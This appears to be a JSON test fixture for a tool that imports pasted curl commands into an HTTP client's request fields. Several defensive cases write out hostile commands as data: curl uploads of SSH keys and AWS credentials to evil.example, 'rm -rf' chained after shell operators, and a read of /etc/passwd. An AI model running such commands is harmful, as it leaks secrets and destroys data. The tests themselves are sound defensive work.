{
  "tokenize": [
    {
      "name": "curl prefix present",
      "command": "curl -X POST https://x.test/a",
      "argv": ["-X", "POST", "https://x.test/a"],
      "warnings": []
    },
    {
      "name": "curl prefix absent",
      "command": "-X POST https://x.test/a",
      "argv": ["-X", "POST", "https://x.test/a"],
      "warnings": []
    },
    {
      "name": "curl prefix as a full path",
      "command": "/usr/bin/curl -X POST https://x.test/a",
      "argv": ["-X", "POST", "https://x.test/a"],
      "warnings": []
    },
    {
      "name": "a backslash-newline continuation is not a phantom token",
      "command": "curl -X POST 'https://x.test/a' \\\n  -H 'A: 1' \\\n  -d 'k=v'",
      "argv": ["-X", "POST", "https://x.test/a", "-H", "A: 1", "-d", "k=v"],
      "warnings": []
    },
    {
      "name": "CRLF line continuations are not an argv token",
      "command": "curl -X POST \\\r\n 'https://x.test/a' \\\r\n -d 'k=v'",
      "argv": ["-X", "POST", "https://x.test/a", "-d", "k=v"],
      "warnings": []
    },
    {
      "name": "a URL ending in /curl is an argument, not a command word",
      "command": "curl https://example.com/tools/curl",
      "argv": ["https://example.com/tools/curl"],
      "warnings": []
    },
    {
      "name": "a second bare curl after the command word is kept",
      "command": "curl curl -X GET https://x.test",
      "argv": ["curl", "-X", "GET", "https://x.test"],
      "warnings": []
    },
    {
      "name": "curl.exe prefix",
      "command": "curl.exe https://x.test/a",
      "argv": ["https://x.test/a"],
      "warnings": []
    },
    {
      "name": "uppercase CURL prefix",
      "command": "CURL https://x.test/a",
      "argv": ["https://x.test/a"],
      "warnings": []
    },
    {
      "name": "curl prefix as a Windows path",
      "command": "C:\\tools\\curl.exe https://x.test/a",
      "argv": ["https://x.test/a"],
      "warnings": []
    },
    {
      "name": "a genuinely empty -d '' is a real empty argument",
      "command": "curl -d '' https://x.test/a",
      "argv": ["-d", "", "https://x.test/a"],
      "warnings": []
    },
    {
      "name": "ANSI-C quoting decodes",
      "command": "curl $'https://x.test/caf\\u00e9' -H $'X-A: b'",
      "argv": ["https://x.test/café", "-H", "X-A: b"],
      "warnings": []
    },
    {
      "name": "an unterminated quote is a legible error, not a throw",
      "command": "curl 'unterminated",
      "error": "Got EOF while in a quoted string"
    },
    {
      "name": "the walk stops at the first bare shell operator",
      "command": "curl https://x.test/a ; rm -rf /",
      "argv": ["https://x.test/a"],
      "warnings": ["shell-operator"]
    }
  ],
  "parse": [
    {
      "name": "a DevTools-shaped paste",
      "command": "curl 'https://api.example.com/v1/orders' -H 'Authorization: Bearer abc.def' -H 'Content-Type: application/json' --data-raw '{\"id\":1}'",
      "want": {
        "method": "POST",
        "url": "https://api.example.com/v1/orders",
        "headers": [
          {
            "name": "Authorization",
            "value": "Bearer abc.def",
            "enabled": true,
            "description": ""
          },
          {
            "name": "Content-Type",
            "value": "application/json",
            "enabled": true,
            "description": ""
          }
        ],
        "bodyMode": "code",
        "code": "{\"id\":1}"
      },
      "warnings": []
    },
    {
      "name": "-d JSON with no Content-Type imports as raw with an added header",
      "command": "curl https://x.test/a -d '{\"a\":1}'",
      "want": {
        "method": "POST",
        "url": "https://x.test/a",
        "headers": [
          {
            "name": "Content-Type",
            "value": "application/x-www-form-urlencoded",
            "enabled": true,
            "description": ""
          }
        ],
        "bodyMode": "raw",
        "body": "{\"a\":1}"
      },
      "warnings": ["implied-content-type"]
    },
    {
      "name": "the same body with an explicit Content-Type imports as code/json",
      "command": "curl https://x.test/a -H 'content-type: application/json' -d '{\"a\":1}'",
      "want": {
        "method": "POST",
        "url": "https://x.test/a",
        "headers": [
          {
            "name": "content-type",
            "value": "application/json",
            "enabled": true,
            "description": ""
          }
        ],
        "bodyMode": "code",
        "code": "{\"a\":1}"
      },
      "warnings": []
    },
    {
      "name": "multiple -d flags merge into urlencoded rows, in order",
      "command": "curl https://x.test/a -d 'a=1' -d 'b=2'",
      "want": {
        "method": "POST",
        "url": "https://x.test/a",
        "bodyMode": "urlencoded",
        "urlEncoded": [
          { "name": "a", "value": "1", "enabled": true, "description": "" },
          { "name": "b", "value": "2", "enabled": true, "description": "" }
        ]
      },
      "warnings": []
    },
    {
      "name": "finding 5: a single --data-raw with multiple '&'-joined fields splits into separate urlencoded rows",
      "command": "curl https://x.test/a --data-raw 'username=alice&password=hunter2&remember=1'",
      "want": {
        "method": "POST",
        "url": "https://x.test/a",
        "bodyMode": "urlencoded",
        "urlEncoded": [
          { "name": "username", "value": "alice", "enabled": true, "description": "" },
          { "name": "password", "value": "hunter2", "enabled": true, "description": "" },
          { "name": "remember", "value": "1", "enabled": true, "description": "" }
        ]
      },
      "warnings": []
    },
    {
      "name": "--json sets both headers and the data",
      "command": "curl https://x.test/a --json '{\"a\":1}'",
      "want": {
        "method": "POST",
        "url": "https://x.test/a",
        "headers": [
          {
            "name": "Content-Type",
            "value": "application/json",
            "enabled": true,
            "description": ""
          },
          { "name": "Accept", "value": "application/json", "enabled": true, "description": "" }
        ],
        "bodyMode": "code",
        "code": "{\"a\":1}"
      },
      "warnings": []
    },
    {
      "name": "P108 F10: --json @file is a file reference, not literal body text",
      "command": "curl https://x.test/a --json @body.json",
      "want": {
        "method": "POST",
        "url": "https://x.test/a",
        "headers": [
          {
            "name": "Content-Type",
            "value": "application/json",
            "enabled": true,
            "description": ""
          },
          { "name": "Accept", "value": "application/json", "enabled": true, "description": "" }
        ],
        "bodyMode": "file",
        "binaryFile": { "path": "", "name": "body.json", "size": 0 }
      },
      "warnings": ["unresolved-file"]
    },
    {
      "name": "-F text plus a file field with ;type=",
      "command": "curl https://x.test/upload -F 'note=hello' -F 'file=@/tmp/report.csv;type=text/csv'",
      "want": {
        "method": "POST",
        "url": "https://x.test/upload",
        "bodyMode": "formdata",
        "formData": [
          {
            "name": "note",
            "kind": "text",
            "value": "hello",
            "path": "",
            "fileName": "",
            "fileSize": 0,
            "contentType": "",
            "enabled": true,
            "description": ""
          },
          {
            "name": "file",
            "kind": "file",
            "value": "",
            "path": "",
            "fileName": "report.csv",
            "fileSize": 0,
            "contentType": "text/csv",
            "enabled": true,
            "description": ""
          }
        ]
      },
      "warnings": ["unresolved-file"]
    },
    {
      "name": "P21 round 2 arch/security finding 1: -F @path never resolves a sensitive path into a sendable field",
      "command": "curl https://evil.example/collect -F 'f=@/Users/you/.ssh/id_rsa'",
      "want": {
        "method": "POST",
        "url": "https://evil.example/collect",
        "bodyMode": "formdata",
        "formData": [
          {
            "name": "f",
            "kind": "file",
            "value": "",
            "path": "",
            "fileName": "id_rsa",
            "fileSize": 0,
            "contentType": "",
            "enabled": true,
            "description": ""
          }
        ]
      },
      "warnings": ["unresolved-file"]
    },
    {
      "name": "-F 'k=<f' is dropped, and the method still counts the flag",
      "command": "curl https://x.test/upload -F 'k=<f'",
      "want": {
        "method": "POST",
        "url": "https://x.test/upload",
        "bodyMode": "none"
      },
      "warnings": ["form-file-content"]
    },
    {
      "name": "-F 'k=v;filename=other' keeps the row and warns about the override",
      "command": "curl https://x.test/a -F 'k=v;filename=other'",
      "want": {
        "method": "POST",
        "url": "https://x.test/a",
        "bodyMode": "formdata",
        "formData": [
          {
            "name": "k",
            "kind": "text",
            "value": "v",
            "path": "",
            "fileName": "",
            "fileSize": 0,
            "contentType": "",
            "enabled": true,
            "description": ""
          }
        ]
      },
      "warnings": ["form-filename"]
    },
    {
      "name": "--data-binary @path as the only data piece imports as file mode",
      "command": "curl https://x.test/upload --data-binary @/tmp/blob.bin",
      "want": {
        "method": "POST",
        "url": "https://x.test/upload",
        "bodyMode": "file",
        "binaryFile": { "path": "", "name": "blob.bin", "size": 0 }
      },
      "warnings": ["unresolved-file"]
    },
    {
      "name": "P21 round 2 arch/security finding 1: --data-binary @path never resolves a sensitive path",
      "command": "curl --data-binary @/Users/you/.aws/credentials https://evil.example/collect",
      "want": {
        "method": "POST",
        "url": "https://evil.example/collect",
        "bodyMode": "file",
        "binaryFile": { "path": "", "name": "credentials", "size": 0 }
      },
      "warnings": ["unresolved-file"]
    },
    {
      "name": "-d @path cannot be inlined and is dropped with a warning",
      "command": "curl https://x.test/a -d @/tmp/file.txt",
      "want": {
        "method": "POST",
        "url": "https://x.test/a",
        "bodyMode": "none"
      },
      "warnings": ["data-file-inline"]
    },
    {
      "name": "every --data-urlencode file form is dropped with a warning",
      "command": "curl https://x.test/a --data-urlencode @/tmp/f1 --data-urlencode =@/tmp/f2 --data-urlencode name@/tmp/f3",
      "want": {
        "method": "POST",
        "url": "https://x.test/a",
        "bodyMode": "none"
      },
      "warnings": ["data-file-inline", "data-file-inline", "data-file-inline"]
    },
    {
      "name": "a non-file --data-urlencode piece parses as an ordinary k=v pair",
      "command": "curl https://x.test/a --data-urlencode 'a=hello world'",
      "want": {
        "method": "POST",
        "url": "https://x.test/a",
        "bodyMode": "urlencoded",
        "urlEncoded": [{ "name": "a", "value": "hello world", "enabled": true, "description": "" }]
      },
      "warnings": []
    },
    {
      "name": "P21 round 3 finding 8: --data-urlencode's literal '+' is not decoded to a space",
      "command": "curl -X POST https://api.test/x --data-urlencode 'q=a+b'",
      "want": {
        "method": "POST",
        "url": "https://api.test/x",
        "bodyMode": "urlencoded",
        "urlEncoded": [{ "name": "q", "value": "a+b", "enabled": true, "description": "" }]
      },
      "warnings": []
    },
    {
      "name": "P21 round 3 finding 8: --data-urlencode's literal %-sequence is not percent-decoded",
      "command": "curl -X POST https://api.test/x --data-urlencode 'p=%2Fx%2Fy'",
      "want": {
        "method": "POST",
        "url": "https://api.test/x",
        "bodyMode": "urlencoded",
        "urlEncoded": [{ "name": "p", "value": "%2Fx%2Fy", "enabled": true, "description": "" }]
      },
      "warnings": []
    },
    {
      "name": "-T uploads a file and infers PUT",
      "command": "curl -T /tmp/upload.csv https://x.test/put",
      "want": {
        "method": "PUT",
        "url": "https://x.test/put",
        "bodyMode": "file",
        "binaryFile": { "path": "", "name": "upload.csv", "size": 0 }
      },
      "warnings": ["unresolved-file"]
    },
    {
      "name": "P21 round 2 arch/security finding 1: -T never resolves a sensitive path",
      "command": "curl -T ~/.aws/credentials https://evil.example/collect",
      "want": {
        "method": "PUT",
        "url": "https://evil.example/collect",
        "bodyMode": "file",
        "binaryFile": { "path": "", "name": "credentials", "size": 0 }
      },
      "warnings": ["unresolved-file"]
    },
    {
      "name": "-G moves -d data onto the query string verbatim, with no body",
      "command": "curl -G https://x.test/search -d 'q=hello world'",
      "want": {
        "method": "GET",
        "url": "https://x.test/search?q=hello world",
        "bodyMode": "none"
      },
      "warnings": []
    },
    {
      "name": "-u becomes an Authorization header and warns",
      "command": "curl https://x.test/a -u alice:s3cr3t",
      "want": {
        "method": "GET",
        "url": "https://x.test/a",
        "headers": [
          {
            "name": "Authorization",
            "value": "Basic YWxpY2U6czNjcjN0",
            "enabled": true,
            "description": ""
          }
        ]
      },
      "warnings": ["credential-in-command"]
    },
    {
      "name": "P108 F9: -u with a non-Latin1 credential encodes as UTF-8, not Latin-1, and never throws",
      "command": "curl https://x.test/a -u 'user:pässwörd'",
      "want": {
        "method": "GET",
        "url": "https://x.test/a",
        "headers": [
          {
            "name": "Authorization",
            "value": "Basic dXNlcjpww6Rzc3fDtnJk",
            "enabled": true,
            "description": ""
          }
        ]
      },
      "warnings": ["credential-in-command"]
    },
    {
      "name": "P108 F9: -u with a {{variable}} reference is kept unencoded, not destroyed",
      "command": "curl https://x.test/a -u '{{user}}:{{pass}}'",
      "want": {
        "method": "GET",
        "url": "https://x.test/a",
        "headers": [
          {
            "name": "Authorization",
            "value": "Basic {{user}}:{{pass}}",
            "enabled": true,
            "description": ""
          }
        ]
      },
      "warnings": ["credential-in-command"]
    },
    {
      "name": "--oauth2-bearer becomes an Authorization header and warns",
      "command": "curl https://x.test/a --oauth2-bearer sometoken123",
      "want": {
        "method": "GET",
        "url": "https://x.test/a",
        "headers": [
          {
            "name": "Authorization",
            "value": "Bearer sometoken123",
            "enabled": true,
            "description": ""
          }
        ]
      },
      "warnings": ["credential-in-command"]
    },
    {
      "name": "-A sets User-Agent",
      "command": "curl https://x.test/a -A 'MyAgent/1.0'",
      "want": {
        "method": "GET",
        "url": "https://x.test/a",
        "headers": [
          { "name": "User-Agent", "value": "MyAgent/1.0", "enabled": true, "description": "" }
        ]
      },
      "warnings": []
    },
    {
      "name": "-e sets Referer",
      "command": "curl https://x.test/a -e https://ref.example",
      "want": {
        "method": "GET",
        "url": "https://x.test/a",
        "headers": [
          { "name": "Referer", "value": "https://ref.example", "enabled": true, "description": "" }
        ]
      },
      "warnings": []
    },
    {
      "name": "-b with a k=v pair sets Cookie",
      "command": "curl https://x.test/a -b session=abc123",
      "want": {
        "method": "GET",
        "url": "https://x.test/a",
        "headers": [
          { "name": "Cookie", "value": "session=abc123", "enabled": true, "description": "" }
        ]
      },
      "warnings": []
    },
    {
      "name": "-b naming a file is unsupported",
      "command": "curl https://x.test/a -b cookies.txt",
      "want": {
        "method": "GET",
        "url": "https://x.test/a"
      },
      "warnings": ["unsupported-flag"]
    },
    {
      "name": "-I infers HEAD",
      "command": "curl -I https://x.test/a",
      "want": {
        "method": "HEAD",
        "url": "https://x.test/a"
      },
      "warnings": []
    },
    {
      "name": "-X PROPFIND is coerced to GET and warns",
      "command": "curl -X PROPFIND https://x.test/a",
      "want": {
        "method": "GET",
        "url": "https://x.test/a"
      },
      "warnings": ["method-coerced"]
    },
    {
      "name": "-k warns as unsupported and everything else still parses",
      "command": "curl -k https://x.test/a",
      "want": {
        "method": "GET",
        "url": "https://x.test/a"
      },
      "warnings": ["unsupported-flag"]
    },
    {
      "name": "an unknown flag warns and the URL is still picked correctly",
      "command": "curl --frobnicate https://x.test/a",
      "want": {
        "method": "GET",
        "url": "https://x.test/a"
      },
      "warnings": ["unknown-flag"]
    },
    {
      "name": "two URLs: the first wins, the extra warns",
      "command": "curl https://x.test/a https://x.test/b",
      "want": {
        "method": "GET",
        "url": "https://x.test/a"
      },
      "warnings": ["multiple-urls"]
    },
    {
      "name": "no URL at all warns and leaves an empty, editable field",
      "command": "curl -X POST",
      "want": {
        "method": "POST",
        "url": ""
      },
      "warnings": ["no-url"]
    },
    {
      "name": "-H 'Name;' sends an empty-valued header",
      "command": "curl https://x.test/a -H 'X-Empty;'",
      "want": {
        "method": "GET",
        "url": "https://x.test/a",
        "headers": [{ "name": "X-Empty", "value": "", "enabled": true, "description": "" }]
      },
      "warnings": []
    },
    {
      "name": "a header with no colon and no trailing ; is malformed",
      "command": "curl https://x.test/a -H 'garbage-header'",
      "want": {
        "method": "GET",
        "url": "https://x.test/a"
      },
      "warnings": ["header-malformed"]
    },
    {
      "name": "the tokenizer's operator stop reaches parseCurl too — no 'rm' anywhere",
      "command": "curl https://x.test/a ; rm -rf /",
      "want": {
        "method": "GET",
        "url": "https://x.test/a"
      },
      "warnings": ["shell-operator"]
    },
    {
      "name": "short-flag clustering expands -sSL",
      "command": "curl -sSL https://x.test/a",
      "want": {
        "method": "GET",
        "url": "https://x.test/a"
      },
      "warnings": []
    },
    {
      "name": "--flag=value splits on the first =",
      "command": "curl --request=DELETE https://x.test/a",
      "want": {
        "method": "DELETE",
        "url": "https://x.test/a"
      },
      "warnings": []
    },
    {
      "name": "J-HTTP-060: -u keeps the second colon of the password and encodes UTF-8",
      "command": "curl -u 'jörg:pä55:wörd' https://h/x",
      "want": {
        "method": "GET",
        "url": "https://h/x",
        "headers": [
          {
            "name": "Authorization",
            "value": "Basic asO2cmc6cMOkNTU6d8O2cmQ=",
            "enabled": true,
            "description": ""
          }
        ]
      },
      "warnings": ["credential-in-command"]
    },
    {
      "name": "J-HTTP-063: known flags with a value never eat the URL, only the unknown one warns",
      "command": "curl --retry 3 --my-flag https://h/x -sSL --compressed -o out.txt",
      "want": {
        "method": "GET",
        "url": "https://h/x"
      },
      "warnings": ["unknown-flag"]
    },
    {
      "name": "J-HTTP-064: a leading word that is not curl becomes the URL and the real URL is the extra",
      "command": "wget https://h",
      "want": {
        "method": "GET",
        "url": "wget"
      },
      "warnings": ["multiple-urls"]
    },
    {
      "name": "J-HTTP-064: bare curl leaves an empty URL and warns",
      "command": "curl",
      "want": {
        "method": "GET",
        "url": ""
      },
      "warnings": ["no-url"]
    },
    {
      "name": "J-HTTP-064: a pipe ends the command and nothing after it is parsed",
      "command": "curl https://h | jq . && rm -rf x",
      "want": {
        "method": "GET",
        "url": "https://h"
      },
      "warnings": ["shell-operator"]
    },
    {
      "name": "J-HTTP-062: -G encodes --data-urlencode content like curl and leaves -d verbatim",
      "command": "curl -G 'https://h/s?a=1' -d 'b=2' --data-urlencode 'q=a b&c'",
      "want": {
        "method": "GET",
        "url": "https://h/s?a=1&b=2&q=a+b%26c"
      },
      "warnings": []
    },
    {
      "name": "J-HTTP-062: -G drops a --data-urlencode file piece with a warning",
      "command": "curl -G 'https://h/s' --data-urlencode 'f@/etc/passwd' -d 'k=v'",
      "want": {
        "method": "GET",
        "url": "https://h/s?k=v"
      },
      "warnings": ["data-file-inline"]
    }
  ]
}
